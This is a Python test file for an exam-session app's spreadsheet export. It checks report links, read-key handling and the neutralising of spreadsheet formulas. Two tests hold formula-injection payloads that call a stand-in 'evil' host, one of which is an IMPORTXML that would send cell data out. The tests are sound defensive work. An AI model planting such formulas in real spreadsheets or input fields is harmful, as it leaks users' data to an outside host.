from __future__ import annotations

from dataclasses import replace
from datetime import datetime

from opic.core.candidate import Candidate
from opic.session.publish import sheet_row
from opic.session.state import Feedback, SessionState


def a_state() -> SessionState:
    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
    state = state.with_candidate(Candidate("김민준", "minjun@example.com"))
    return state.with_feedback(Feedback(rating=5, comment="좋았습니다"))


def test_every_column_is_filled_from_the_session():
    state = a_state()
    row = sheet_row(state, {"final_level": "IH"}, "https://opic.example.com")
    assert row == {
        "timestamp": "2026-08-31T14:30:52",
        "session_id": "Nk7Qz",
        "name": "김민준",
        "email": "minjun@example.com",
        "level": "IH",
        "rating": "5",
        "comment": "좋았습니다",
        "report_url": (
            f"https://opic.example.com/api/sessions/Nk7Qz/page?r={state.read_key}"
        ),
    }


def test_the_link_carries_the_key_that_opens_the_report():
    """La cookie de la sesión la tiene el candidato. El dueño abre esto desde la
    hoja, en otro navegador, y sin la clave vería el mismo 404 que un extraño."""
    state = a_state()
    row = sheet_row(state, None, "https://opic.example.com")

    assert row["report_url"].endswith(f"?r={state.read_key}")
    # La de lectura, nunca la del dueño: el enlace vive en una hoja que se
    # comparte, y no debe poder mandar respuestas ni opiniones.
    assert state.owner_key not in row["report_url"]


def test_a_session_from_before_the_keys_links_the_way_it_always_did():
    """Las sesiones que ya estaban en disco no tienen clave que añadir, y su
    informe se abre sin ella."""
    state = replace(a_state(), owner_key=None, read_key=None)

    row = sheet_row(state, None, "https://opic.example.com")

    assert row["report_url"] == "https://opic.example.com/api/sessions/Nk7Qz/page"


def test_an_exam_that_never_got_a_grade_leaves_the_level_empty():
    assert sheet_row(a_state(), None, "https://opic.example.com")["level"] == ""


def test_without_a_public_url_there_is_no_link_to_offer():
    assert sheet_row(a_state(), {"final_level": "IH"}, "")["report_url"] == ""


def test_a_trailing_slash_does_not_double_up():
    state = a_state()
    row = sheet_row(state, None, "https://opic.example.com/")
    assert row["report_url"] == (
        f"https://opic.example.com/api/sessions/Nk7Qz/page?r={state.read_key}"
    )


def test_a_session_with_no_candidate_still_makes_a_row():
    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
    row = sheet_row(state.with_feedback(Feedback(3, "")), None, "")
    assert row["name"] == ""
    assert row["email"] == ""
    assert row["rating"] == "3"


def test_a_comment_that_looks_like_a_formula_is_defused():
    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
    state = state.with_feedback(
        Feedback(3, '=IMPORTXML("http://evil/?d="&A1)')
    )
    row = sheet_row(state, None, "")
    assert row["comment"] == "'" + '=IMPORTXML("http://evil/?d="&A1)'


def test_a_name_that_looks_like_a_formula_is_defused():
    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
    state = state.with_candidate(Candidate('=HYPERLINK("http://evil","hi")', "a@b.com"))
    row = sheet_row(state, None, "")
    assert row["name"] == "'" + '=HYPERLINK("http://evil","hi")'


def test_every_formula_trigger_character_is_defused():
    for trigger in ("=", "+", "-", "@"):
        state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
        state = state.with_feedback(Feedback(3, f"{trigger}dangerous"))
        row = sheet_row(state, None, "")
        assert row["comment"] == f"'{trigger}dangerous"


def test_an_ordinary_comment_and_email_are_returned_unchanged():
    row = sheet_row(a_state(), None, "")
    assert row["comment"] == "좋았습니다"
    assert row["email"] == "minjun@example.com"


def test_an_empty_value_stays_empty_and_does_not_crash():
    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
    row = sheet_row(state.with_feedback(Feedback(3, "")), None, "")
    assert row["comment"] == ""
    assert row["name"] == ""
    assert row["report_url"] == ""
